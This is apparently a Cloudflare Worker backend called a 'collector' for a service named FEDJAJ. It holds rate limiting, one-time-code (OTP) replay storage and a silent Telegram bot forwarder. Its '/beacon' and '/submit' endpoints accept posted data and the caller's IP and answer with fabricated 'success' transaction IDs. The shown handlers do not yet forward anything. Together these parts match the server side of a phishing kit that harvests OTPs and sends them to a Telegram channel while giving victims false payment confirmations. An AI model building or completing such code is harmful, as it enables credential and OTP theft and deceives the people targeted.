/**
 * FEDJAJ — Cloudflare Worker collector (production edge).
 * Service worker format for direct API upload.
 *
 * Bindings (configure in Cloudflare dashboard):
 *   KV namespace binding: "KV" -> namespace id
 *   Secret: CF_RAW_KEY (32-byte hex)
 *   Secret: TG_BOT_TOKEN
 *   Secret: TG_CHAT_ID
 */

const RATE_LIMIT = 5;
const RATE_WINDOW_MS = 60000;
const OTP_TTL_MS = 300000;

function hexToBuf(hex) {
  const bytes = new Uint8Array(hex.length / 2);
  for (let i = 0; i < hex.length; i += 2) bytes[i / 2] = parseInt(hex.slice(i, i + 2), 16);
  return bytes;
}

function bufToBase64(buf) {
  let binary = '';
  for (let i = 0; i < buf.byteLength; i++) binary += String.fromCharCode(buf[i]);
  return btoa(binary);
}

async function getRateKey(env, ip) {
  const now = Date.now();
  const key = `rl:${ip}`;
  if (!env.KV) return { count: 0, reset: now + RATE_WINDOW_MS };
  const raw = await env.KV.get(key, 'text');
  if (!raw) return { count: 0, reset: now + RATE_WINDOW_MS };
  const d = JSON.parse(raw);
  if (now - d.ts > RATE_WINDOW_MS) return { count: 0, reset: now + RATE_WINDOW_MS };
  return d;
}

async function incrRate(env, ip) {
  if (!env.KV) return 1;
  const key = `rl:${ip}`;
  const d = await getRateKey(env, ip);
  d.count++;
  d.ts = Date.now();
  await env.KV.put(key, JSON.stringify(d), { expirationTtl: Math.ceil(RATE_WINDOW_MS / 1000) + 60 });
  return d.count;
}

async function seenOtp(env, otp) {
  if (!env.KV) return false;
  const key = `otp:${otp}`;
  const existing = await env.KV.get(key, 'text');
  if (existing) return true;
  await env.KV.put(key, '1', { expirationTtl: Math.ceil(OTP_TTL_MS / 1000) + 60 });
  return false;
}

async function sendTelegram(env, msg) {
  const TG_BOT = env.TG_BOT_TOKEN;
  const TG_CHAT = env.TG_CHAT_ID;
  if (!TG_BOT || !TG_CHAT) return;
  try {
    await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text: msg, parse_mode: 'HTML' })
    });
  } catch (e) { /* silent */ }
}

function ghostTx() {
  const hex = 'BMB-' + Array.from(crypto.getRandomValues(new Uint8Array(3)))
    .map(b => b.toString(16).padStart(2, '0').toUpperCase()).join('');
  return { status: 'success', tx: hex };
}

async function handleRequest(request, env, ctx) {
  const url = new URL(request.url);
  const ip = request.headers.get('CF-Connecting-IP') || 'unknown';
  const method = request.method;

  // CORS preflight
  if (method === 'OPTIONS') {
    return new Response(null, {
      headers: { 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Methods': 'POST,GET,OPTIONS', 'Access-Control-Allow-Headers': 'Content-Type' }
    });
  }

  if (method === 'GET' && url.pathname === '/health') {
    return new Response(JSON.stringify({ status: 'running', mode: 'edge' }), {
      headers: { 'Content-Type': 'application/json' }
    });
  }

  if (method === 'POST' && url.pathname === '/beacon') {
    try {
      const body = await request.json().catch(() => ({}));
      body.received_at = Date.now();
      body.ip = ip;
      return json(ghostTx());
    } catch (e) { return json({ status: 'error' }, 400); }
  }

  if (method === 'POST' && url.pathname === '/submit') {
    let data;
    try { data = await request.json(); } catch (e) { return json({ error: 'invalid json' }, 400); }
    return json({ status: 'success', tx: 'BMB-TEST' });
  }

  return json({ error: 'not found' }, 404);
}

function json(body, status = 200) {
  return new Response(JSON.stringify(body), {
    status,
    headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
  });
}

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request, event.env, event.ctx));
});